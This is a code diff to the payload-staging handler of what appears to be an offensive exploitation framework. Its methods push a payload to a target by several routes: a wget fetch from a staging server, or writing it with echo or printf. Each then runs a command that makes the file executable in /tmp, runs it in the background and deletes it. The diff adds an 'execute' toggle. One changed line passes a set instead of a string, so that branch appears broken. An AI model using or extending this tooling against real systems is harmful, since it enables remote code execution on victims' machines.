@@ -85,14 +85,17 @@ class Handler(TCP):
         requests.post(wget_server.format(wget_bin, wget_file), data=payload)
         self.badges.output_process("Uploading payload...")
 
-        command = wget_stream.format(wget_server, path)
-        args = args if args is not None else ""
-
-        self.badges.output_process("Executing payload...")
-        if encode:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'\n".encode())
+        if execute:
+            self.badges.output_process("Executing payload...")
+            command = f"{wget_stream.format(wget_server, path)} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'"
+            args = args if args is not None else ""
         else:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
+            command = wget_stream.format(wget_server, path)
+
+        if encode:
+            sender(*args, f"{command}\n".encode())
+        else:
+            sender(*args, {command})
         requests.delete(wget_container)
 
     def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False):
@@ -117,13 +120,13 @@ class Handler(TCP):
             else:
                 sender(*args, command)
 
-        args = args if args is not None else ""
-
-        self.badges.output_process("Executing payload...")
-        if encode:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'\n".encode())
-        else:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
+        if execute:
+            self.badges.output_process("Executing payload...")
+            args = args if args is not None else ""
+            if encode:
+                sender(*args, f"chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'\n".encode())
+            else:
+                sender(*args, f"chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
     
     def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';', location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
@@ -147,13 +150,13 @@ class Handler(TCP):
             else:
                 sender(*args, command)
 
-        args = args if args is not None else ""
-
-        self.badges.output_process("Executing payload...")
-        if encode:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'\n".encode())
-        else:
-            sender(*args, f"{command} {delim} chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
+        if execute:
+            self.badges.output_process("Executing payload...")
+            args = args if args is not None else ""
+            if encode:
+                sender(*args, f"chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'\n".encode())
+            else:
+                sender(*args, f"chmod 777 {path} {delim} sh -c '{path} {payload_args} && rm {path} 2>/dev/null &'")
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
